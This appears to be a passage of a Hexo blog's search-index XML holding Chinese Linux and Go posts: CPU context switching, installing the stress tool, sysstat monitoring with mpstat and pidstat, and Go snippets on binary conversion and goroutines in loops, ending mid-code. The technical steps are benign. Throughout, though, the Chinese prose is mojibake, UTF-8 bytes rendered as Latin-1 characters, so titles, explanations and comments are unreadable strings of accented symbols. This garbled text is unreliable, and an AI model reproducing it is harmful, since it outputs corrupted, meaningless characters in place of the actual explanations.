¸æ€çš„è½¬å˜ï¼Œéœ€è¦é€šè¿‡<strong>ç³»ç»Ÿè°ƒç”¨</strong>æ¥å®Œæˆã€‚<br>ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šå‘ç”Ÿcpuçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œ<br>CPU å¯„å­˜å™¨é‡ŒåŸæ¥ç”¨æˆ·æ€çš„æŒ‡ä»¤ä½ç½®ï¼Œéœ€è¦å…ˆä¿å­˜èµ·æ¥ã€‚æ¥ç€ï¼Œä¸ºäº†æ‰§è¡Œå†…æ ¸æ€ä»£ç ï¼ŒCPU å¯„å­˜å™¨éœ€è¦æ›´æ–°ä¸ºå†…æ ¸æ€æŒ‡ä»¤çš„æ–°ä½ç½®ã€‚æœ€åæ‰æ˜¯è·³è½¬åˆ°å†…æ ¸æ€è¿è¡Œå†…æ ¸ä»»åŠ¡ã€‚<br>è€Œç³»ç»Ÿè°ƒç”¨ç»“æŸåï¼ŒCPU å¯„å­˜å™¨éœ€è¦<strong>æ¢å¤</strong>åŸæ¥ä¿å­˜çš„ç”¨æˆ·æ€ï¼Œç„¶åå†åˆ‡æ¢åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç»§ç»­è¿è¡Œè¿›ç¨‹ã€‚æ‰€ä»¥ï¼Œä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ï¼Œå…¶å®æ˜¯å‘ç”Ÿäº†ä¸¤æ¬¡ CPU ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚<br>ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸ä¼šæ¶‰åŠåˆ°è™šæ‹Ÿå†…å­˜ç­‰è¿›ç¨‹ç”¨æˆ·æ€çš„èµ„æºï¼Œä¹Ÿä¸ä¼šåˆ‡æ¢è¿›ç¨‹ã€‚è¿™è·Ÿæˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯ä¸ä¸€æ ·çš„ï¼š</p><ul><li>è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ˜¯æŒ‡ä»ä¸€ä¸ªè¿›ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹è¿è¡Œã€‚</li><li>è€Œç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹ä¸­ä¸€ç›´æ˜¯åŒä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œã€‚</li></ul><p>å› æ­¤ï¼Œè¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å°±æ¯”ç³»ç»Ÿè°ƒç”¨æ—¶å¤šäº†ä¸€æ­¥ï¼šåœ¨ä¿å­˜å½“å‰è¿›ç¨‹çš„å†…æ ¸çŠ¶æ€å’Œ CPU å¯„å­˜å™¨ä¹‹å‰ï¼Œéœ€è¦å…ˆæŠŠè¯¥è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ã€æ ˆç­‰ä¿å­˜ä¸‹æ¥ï¼›è€ŒåŠ è½½äº†ä¸‹ä¸€è¿›ç¨‹çš„å†…æ ¸æ€åï¼Œè¿˜éœ€è¦åˆ·æ–°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜å’Œç”¨æˆ·æ ˆã€‚<br>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¿å­˜ä¸Šä¸‹æ–‡å’Œæ¢å¤ä¸Šä¸‹æ–‡çš„è¿‡ç¨‹å¹¶ä¸æ˜¯â€œå…è´¹â€çš„ï¼Œéœ€è¦å†…æ ¸åœ¨ CPU ä¸Šè¿è¡Œæ‰èƒ½å®Œæˆã€‚<br><img src="https://snowgo.top/medias/medias/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/2.png"></p><h3 id="ä»€ä¹ˆæ—¶å€™å‘ç”Ÿè¿›ç¨‹è°ƒåº¦"><a href="#ä»€ä¹ˆæ—¶å€™å‘ç”Ÿè¿›ç¨‹è°ƒåº¦" class="headerlink" title="ä»€ä¹ˆæ—¶å€™å‘ç”Ÿè¿›ç¨‹è°ƒåº¦"></a>ä»€ä¹ˆæ—¶å€™å‘ç”Ÿè¿›ç¨‹è°ƒåº¦</h3><ol><li>å…¶ä¸€ï¼Œä¸ºäº†ä¿è¯æ‰€æœ‰è¿›ç¨‹å¯ä»¥å¾—åˆ°å…¬å¹³è°ƒåº¦ï¼ŒCPU æ—¶é—´è¢«åˆ’åˆ†ä¸ºä¸€æ®µæ®µçš„æ—¶é—´ç‰‡ï¼Œè¿™äº›æ—¶é—´ç‰‡å†è¢«è½®æµåˆ†é…ç»™å„ä¸ªè¿›ç¨‹ã€‚è¿™æ ·ï¼Œå½“æŸä¸ªè¿›ç¨‹çš„æ—¶é—´ç‰‡è€—å°½äº†ï¼Œå°±ä¼šè¢«ç³»ç»ŸæŒ‚èµ·ï¼Œåˆ‡æ¢åˆ°å…¶å®ƒæ­£åœ¨ç­‰å¾… CPU çš„è¿›ç¨‹è¿è¡Œã€‚</li><li>å…¶äºŒï¼Œè¿›ç¨‹åœ¨ç³»ç»Ÿèµ„æºä¸è¶³ï¼ˆæ¯”å¦‚å†…å­˜ä¸è¶³ï¼‰æ—¶ï¼Œè¦ç­‰åˆ°èµ„æºæ»¡è¶³åæ‰å¯ä»¥è¿è¡Œï¼Œè¿™ä¸ªæ—¶å€™è¿›ç¨‹ä¹Ÿä¼šè¢«æŒ‚èµ·ï¼Œå¹¶ç”±ç³»ç»Ÿè°ƒåº¦å…¶ä»–è¿›ç¨‹è¿è¡Œã€‚</li><li>å…¶ä¸‰ï¼Œå½“è¿›ç¨‹é€šè¿‡ç¡çœ å‡½æ•° sleep è¿™æ ·çš„æ–¹æ³•å°†è‡ªå·±ä¸»åŠ¨æŒ‚èµ·æ—¶ï¼Œè‡ªç„¶ä¹Ÿä¼šé‡æ–°è°ƒåº¦ã€‚</li><li>å…¶å››ï¼Œå½“æœ‰ä¼˜å…ˆçº§æ›´é«˜çš„è¿›ç¨‹è¿è¡Œæ—¶ï¼Œä¸ºäº†ä¿è¯é«˜ä¼˜å…ˆçº§è¿›ç¨‹çš„è¿è¡Œï¼Œå½“å‰è¿›ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œç”±é«˜ä¼˜å…ˆçº§è¿›ç¨‹æ¥è¿è¡Œã€‚</li><li>æœ€åä¸€ä¸ªï¼Œå‘ç”Ÿç¡¬ä»¶ä¸­æ–­æ—¶ï¼ŒCPU ä¸Šçš„è¿›ç¨‹ä¼šè¢«ä¸­æ–­æŒ‚èµ·ï¼Œè½¬è€Œæ‰§è¡Œå†…æ ¸ä¸­çš„ä¸­æ–­æœåŠ¡ç¨‹åºã€‚</li></ol><h2 id="çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢"><a href="#çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢" class="headerlink" title="çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢"></a>çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢</h2><p>çº¿ç¨‹ä¸è¿›ç¨‹æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œ<strong>çº¿ç¨‹æ˜¯è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œè€Œè¿›ç¨‹åˆ™æ˜¯èµ„æºæ‹¥æœ‰çš„åŸºæœ¬å•ä½</strong>ã€‚è¯´ç™½äº†ï¼Œæ‰€è°“å†…æ ¸ä¸­çš„ä»»åŠ¡è°ƒåº¦ï¼Œå®é™…ä¸Šçš„è°ƒåº¦å¯¹è±¡æ˜¯çº¿ç¨‹ï¼›è€Œè¿›ç¨‹åªæ˜¯ç»™çº¿ç¨‹æä¾›äº†è™šæ‹Ÿå†…å­˜ã€å…¨å±€å˜é‡ç­‰èµ„æºã€‚æ‰€ä»¥ï¼Œå¯¹äºçº¿ç¨‹å’Œè¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç†è§£ï¼š</p><ul><li>å½“è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œå¯ä»¥è®¤ä¸ºè¿›ç¨‹å°±ç­‰äºçº¿ç¨‹ã€‚</li><li><strong>å½“è¿›ç¨‹æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹æ—¶ï¼Œè¿™äº›çº¿ç¨‹ä¼šå…±äº«ç›¸åŒçš„è™šæ‹Ÿå†…å­˜å’Œå…¨å±€å˜é‡ç­‰èµ„æºã€‚è¿™äº›èµ„æºåœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶æ˜¯ä¸éœ€è¦ä¿®æ”¹çš„ã€‚</strong></li><li>å¦å¤–ï¼Œçº¿ç¨‹ä¹Ÿæœ‰è‡ªå·±çš„ç§æœ‰æ•°æ®ï¼Œæ¯”å¦‚æ ˆå’Œå¯„å­˜å™¨ç­‰ï¼Œè¿™äº›åœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶ä¹Ÿæ˜¯éœ€è¦ä¿å­˜çš„ã€‚</li></ul><p>è¿™ä¹ˆä¸€æ¥ï¼Œçº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å…¶å®å°±å¯ä»¥åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š</p><ol><li>ç¬¬ä¸€ç§ï¼Œ å‰åä¸¤ä¸ªçº¿ç¨‹å±äºä¸åŒè¿›ç¨‹ã€‚æ­¤æ—¶ï¼Œå› ä¸ºèµ„æºä¸å…±äº«ï¼Œæ‰€ä»¥åˆ‡æ¢è¿‡ç¨‹å°±è·Ÿè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯ä¸€æ ·ã€‚</li><li>ç¬¬äºŒç§ï¼Œå‰åä¸¤ä¸ªçº¿ç¨‹å±äºåŒä¸€ä¸ªè¿›ç¨‹ã€‚æ­¤æ—¶ï¼Œå› ä¸ºè™šæ‹Ÿå†…å­˜æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥åœ¨åˆ‡æ¢æ—¶ï¼Œè™šæ‹Ÿå†…å­˜è¿™äº›èµ„æºå°±ä¿æŒä¸åŠ¨ï¼Œåªéœ€è¦åˆ‡æ¢çº¿ç¨‹çš„ç§æœ‰æ•°æ®ã€å¯„å­˜å™¨ç­‰ä¸å…±äº«çš„æ•°æ®ã€‚</li></ol><p>åˆ°è¿™é‡Œä½ åº”è¯¥ä¹Ÿå‘ç°äº†ï¼Œè™½ç„¶åŒä¸ºä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä½†åŒè¿›ç¨‹å†…çš„çº¿ç¨‹åˆ‡æ¢ï¼Œè¦æ¯”å¤šè¿›ç¨‹é—´çš„åˆ‡æ¢æ¶ˆè€—æ›´å°‘çš„èµ„æºï¼Œè€Œè¿™ï¼Œä¹Ÿæ­£æ˜¯å¤šçº¿ç¨‹ä»£æ›¿å¤šè¿›ç¨‹çš„ä¸€ä¸ªä¼˜åŠ¿ã€‚</p><h2 id="ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢"><a href="#ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢" class="headerlink" title="ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢"></a>ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢</h2><p>ä¸ºäº†å¿«é€Ÿå“åº”ç¡¬ä»¶çš„äº‹ä»¶ï¼Œ<strong>ä¸­æ–­å¤„ç†ä¼šæ‰“æ–­è¿›ç¨‹çš„æ­£å¸¸è°ƒåº¦å’Œæ‰§è¡Œ</strong>ï¼Œè½¬è€Œè°ƒç”¨ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå“åº”è®¾å¤‡äº‹ä»¶ã€‚è€Œåœ¨æ‰“æ–­å…¶ä»–è¿›ç¨‹æ—¶ï¼Œå°±éœ€è¦å°†è¿›ç¨‹å½“å‰çš„çŠ¶æ€ä¿å­˜ä¸‹æ¥ï¼Œè¿™æ ·åœ¨ä¸­æ–­ç»“æŸåï¼Œè¿›ç¨‹ä»ç„¶å¯ä»¥ä»åŸæ¥çš„çŠ¶æ€æ¢å¤è¿è¡Œã€‚<br>ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢å¹¶ä¸æ¶‰åŠåˆ°è¿›ç¨‹çš„ç”¨æˆ·æ€ã€‚æ‰€ä»¥ï¼Œå³ä¾¿ä¸­æ–­è¿‡ç¨‹æ‰“æ–­äº†ä¸€ä¸ªæ­£å¤„åœ¨ç”¨æˆ·æ€çš„è¿›ç¨‹ï¼Œä¹Ÿä¸éœ€è¦ä¿å­˜å’Œæ¢å¤è¿™ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ã€å…¨å±€å˜é‡ç­‰ç”¨æˆ·æ€èµ„æºã€‚ä¸­æ–­ä¸Šä¸‹æ–‡ï¼Œå…¶å®åªåŒ…æ‹¬å†…æ ¸æ€ä¸­æ–­æœåŠ¡ç¨‹åºæ‰§è¡Œæ‰€å¿…éœ€çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬ CPU å¯„å­˜å™¨ã€å†…æ ¸å †æ ˆã€ç¡¬ä»¶ä¸­æ–­å‚æ•°ç­‰ã€‚<br><strong>å¯¹åŒä¸€ä¸ª CPU æ¥è¯´ï¼Œä¸­æ–­å¤„ç†æ¯”è¿›ç¨‹æ‹¥æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§</strong>ï¼Œæ‰€ä»¥ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢å¹¶ä¸ä¼šä¸è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢åŒæ—¶å‘ç”Ÿã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li>CPU ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ˜¯ä¿è¯ Linux ç³»ç»Ÿæ­£å¸¸å·¥ä½œçš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦æˆ‘ä»¬ç‰¹åˆ«å…³æ³¨ã€‚</li><li>ä½†è¿‡å¤šçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä¼šæŠŠ CPU æ—¶é—´æ¶ˆè€—åœ¨å¯„å­˜å™¨ã€å†…æ ¸æ ˆä»¥åŠè™šæ‹Ÿå†…å­˜ç­‰æ•°æ®çš„ä¿å­˜å’Œæ¢å¤ä¸Šï¼Œä»è€Œç¼©çŸ­è¿›ç¨‹çœŸæ­£è¿è¡Œçš„æ—¶é—´ï¼Œå¯¼è‡´ç³»ç»Ÿçš„æ•´ä½“æ€§èƒ½å¤§å¹…ä¸‹é™ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå®‰è£…å‹æµ‹å·¥å…·stress</title>
      <link href="/2022/06/20/Linux%E5%AE%89%E8%A3%85%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7stress/"/>
      <url>/2022/06/20/Linux%E5%AE%89%E8%A3%85%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7stress/</url>
      
        <content type="html"><![CDATA[<h2 id="stressç®€ä»‹"><a href="#stressç®€ä»‹" class="headerlink" title="stressç®€ä»‹"></a>stressç®€ä»‹</h2><p>stressæ˜¯ä¸€ä¸ªlinuxä¸‹çš„<a href="https://so.csdn.net/so/search?q=%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">å‹åŠ›æµ‹è¯•</a>å·¥å…·ï¼Œä¸“é—¨ä¸ºé‚£äº›æƒ³è¦æµ‹è¯•è‡ªå·±çš„ç³»ç»Ÿï¼Œå®Œå…¨é«˜è´Ÿè·å’Œç›‘ç£è¿™äº›è®¾å¤‡è¿è¡Œçš„ç”¨æˆ·ã€‚<br>ä½†æ˜¯åœ¨centosçš„yumæºä¸­å¹¶æœªæ‰¾åˆ°æ­¤åŒ…ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä¸‹è½½å®‰è£…ã€‚</p><h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p><a href="http://archlinux.mirror.beocat.ksu.edu/other/community/stress/stress-1.0.4.tar.gz">ç‚¹å‡»ä¸‹è½½</a><br>ä¾æ¬¡æ‰§è¡Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf stress<span class="number">-1.0</span><span class="number">.4</span>.tar.gz</span><br><span class="line">cd stress<span class="number">-1.0</span><span class="number">.4</span>/</span><br><span class="line">./configure</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> check</span><br><span class="line"><span class="built_in">make</span> install #ç”¨rootæƒé™</span><br></pre></td></tr></table></figure><p>ä¹‹åè¾“å…¥stressï¼Œå®‰è£…æˆåŠŸä¼šæ˜¾ç¤ºå¦‚å›¾stressè¯´æ˜åŠä½¿ç”¨å¸®åŠ©<br><img src="https://snowgo.top/medias/medias/Linux%E5%AE%89%E8%A3%85%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7stress/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå®‰è£…æ€§èƒ½å·¥å…·sysstat</title>
      <link href="/2022/06/20/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/"/>
      <url>/2022/06/20/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹åŠå®‰è£…"><a href="#ç®€ä»‹åŠå®‰è£…" class="headerlink" title="ç®€ä»‹åŠå®‰è£…"></a>ç®€ä»‹åŠå®‰è£…</h2><p>sysstat åŒ…å«äº†å¸¸ç”¨çš„ Linux æ€§èƒ½å·¥å…·ï¼Œç”¨æ¥ç›‘æ§å’Œåˆ†æç³»ç»Ÿçš„æ€§èƒ½ã€‚</p><ul><li>mpstat æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å¤šæ ¸ CPU æ€§èƒ½åˆ†æå·¥å…·ï¼Œç”¨æ¥å®æ—¶æŸ¥çœ‹æ¯ä¸ª CPU çš„æ€§èƒ½æŒ‡æ ‡ï¼Œä»¥åŠæ‰€æœ‰ CPU çš„å¹³å‡æŒ‡æ ‡ã€‚</li><li>pidstat æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„è¿›ç¨‹æ€§èƒ½åˆ†æå·¥å…·ï¼Œç”¨æ¥å®æ—¶æŸ¥çœ‹è¿›ç¨‹çš„ CPUã€å†…å­˜ã€I/O ä»¥åŠä¸Šä¸‹æ–‡åˆ‡æ¢ç­‰æ€§èƒ½æŒ‡æ ‡ã€‚</li></ul><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p><code>yum install sysstat</code></p><h2 id="æ¡ˆä¾‹åˆ†æ"><a href="#æ¡ˆä¾‹åˆ†æ" class="headerlink" title="æ¡ˆä¾‹åˆ†æ"></a>æ¡ˆä¾‹åˆ†æ</h2><h3 id="åœºæ™¯ä¸€ï¼šCPU-å¯†é›†å‹è¿›ç¨‹"><a href="#åœºæ™¯ä¸€ï¼šCPU-å¯†é›†å‹è¿›ç¨‹" class="headerlink" title="åœºæ™¯ä¸€ï¼šCPU å¯†é›†å‹è¿›ç¨‹"></a>åœºæ™¯ä¸€ï¼šCPU å¯†é›†å‹è¿›ç¨‹</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯è¿è¡Œ stress å‘½ä»¤ï¼Œæ¨¡æ‹Ÿä¸€ä¸ª CPU ä½¿ç”¨ç‡ 100% çš„åœºæ™¯ï¼š<br><code>stress --cpu 1 --timeout 600</code><br><img src="https://snowgo.top/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/0.png"><br>æ¥ç€ï¼Œåœ¨ç¬¬äºŒä¸ªç»ˆç«¯è¿è¡Œ uptime æŸ¥çœ‹å¹³å‡è´Ÿè½½çš„å˜åŒ–æƒ…å†µï¼š<br><code>watch -d uptime</code><br><img src="https://snowgo.top/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/1.png"><br>æœ€åï¼Œåœ¨ç¬¬ä¸‰ä¸ªç»ˆç«¯è¿è¡Œ mpstat æŸ¥çœ‹ CPU ä½¿ç”¨ç‡çš„å˜åŒ–æƒ…å†µï¼š<br><code>mpstat -P ALL 5</code><br><img src="https://snowgo.top/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/2.png"><br>é‚£ä¹ˆï¼Œåˆ°åº•æ˜¯å“ªä¸ªè¿›ç¨‹å¯¼è‡´äº† CPU ä½¿ç”¨ç‡ä¸º 100% å‘¢ï¼Ÿä½ å¯ä»¥ä½¿ç”¨ pidstat æ¥æŸ¥è¯¢ï¼š<br><code>pidstat -u 5 1000</code><br><img src="https://snowgo.top/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/3.png"><br>ä»è¿™é‡Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°ï¼Œstress è¿›ç¨‹çš„ CPU ä½¿ç”¨ç‡ä¸º 100%ã€‚</p><h3 id="æ¨¡æ‹Ÿå…¶ä»–åœºæ™¯"><a href="#æ¨¡æ‹Ÿå…¶ä»–åœºæ™¯" class="headerlink" title="æ¨¡æ‹Ÿå…¶ä»–åœºæ™¯"></a>æ¨¡æ‹Ÿå…¶ä»–åœºæ™¯</h3><h4 id="I-O-å¯†é›†å‹è¿›ç¨‹"><a href="#I-O-å¯†é›†å‹è¿›ç¨‹" class="headerlink" title="I/O å¯†é›†å‹è¿›ç¨‹"></a>I/O å¯†é›†å‹è¿›ç¨‹</h4><p>æ¨¡æ‹Ÿ I/O å‹åŠ›ï¼Œå³ä¸åœåœ°æ‰§è¡Œ syncï¼š<br><code>stress -i 1 --timeout 600</code></p><h4 id="å¤§é‡è¿›ç¨‹çš„åœºæ™¯"><a href="#å¤§é‡è¿›ç¨‹çš„åœºæ™¯" class="headerlink" title="å¤§é‡è¿›ç¨‹çš„åœºæ™¯"></a>å¤§é‡è¿›ç¨‹çš„åœºæ™¯</h4><p>å½“ç³»ç»Ÿä¸­è¿è¡Œè¿›ç¨‹è¶…å‡º CPU è¿è¡Œèƒ½åŠ›æ—¶ï¼Œå°±ä¼šå‡ºç°ç­‰å¾… CPU çš„è¿›ç¨‹ã€‚<br>æ¯”å¦‚ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨ stressï¼Œä½†è¿™æ¬¡æ¨¡æ‹Ÿçš„æ˜¯ 8 ä¸ªè¿›ç¨‹ï¼š<br><code>stress -c 8 --timeout 600</code></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goç®—æ³•é¢˜æ•´ç†ä¹‹éšä¾¿æ•´ç†</title>
      <link href="/2022/06/19/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E9%9A%8F%E4%BE%BF%E6%95%B4%E7%90%86/"/>
      <url>/2022/06/19/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E9%9A%8F%E4%BE%BF%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="10è¿›åˆ¶è½¬åŒ–æˆxè¿›åˆ¶è¡¨ç¤º"><a href="#10è¿›åˆ¶è½¬åŒ–æˆxè¿›åˆ¶è¡¨ç¤º" class="headerlink" title="10è¿›åˆ¶è½¬åŒ–æˆxè¿›åˆ¶è¡¨ç¤º"></a>10è¿›åˆ¶è½¬åŒ–æˆxè¿›åˆ¶è¡¨ç¤º</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†åè¿›åˆ¶æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">convertToBin</span><span class="params">(num <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">s := <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> num == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// num /= 2 æ¯æ¬¡å¾ªç¯çš„æ—¶å€™ éƒ½å°†numé™¤ä»¥2  å†æŠŠç»“æœèµ‹å€¼ç»™ num</span></span><br><span class="line"><span class="keyword">for</span> ; num &gt; <span class="number">0</span>; num /= <span class="number">2</span> &#123;</span><br><span class="line">lsb := num % <span class="number">2</span></span><br><span class="line"><span class="comment">// strconv.Itoa() å°†æ•°å­—å¼ºåˆ¶æ€§è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">s = strconv.Itoa(lsb) + s</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">tmp := convertToBin(<span class="number">18</span>)</span><br><span class="line">fmt.Println(tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goåˆ†æé¢˜ä¹‹forå¾ªç¯é‡Œæ‰§è¡Œåç¨‹ï¼Œæ‰“å°iå€¼</title>
      <link href="/2022/06/13/go%E5%88%86%E6%9E%90%E9%A2%98%E4%B9%8Bfor%E5%BE%AA%E7%8E%AF%E9%87%8C%E6%89%A7%E8%A1%8C%E5%8D%8F%E7%A8%8B%EF%BC%8C%E6%89%93%E5%8D%B0i%E5%80%BC/"/>
      <url>/2022/06/13/go%E5%88%86%E6%9E%90%E9%A2%98%E4%B9%8Bfor%E5%BE%AA%E7%8E%AF%E9%87%8C%E6%89%A7%E8%A1%8C%E5%8D%8F%E7%A8%8B%EF%BC%8C%E6%89%93%E5%8D%B0i%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="æƒ…å†µä¸€"><a href="#æƒ…å†µä¸€" class="headerlink" title="æƒ…å†µä¸€"></a>æƒ…å†µä¸€</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ 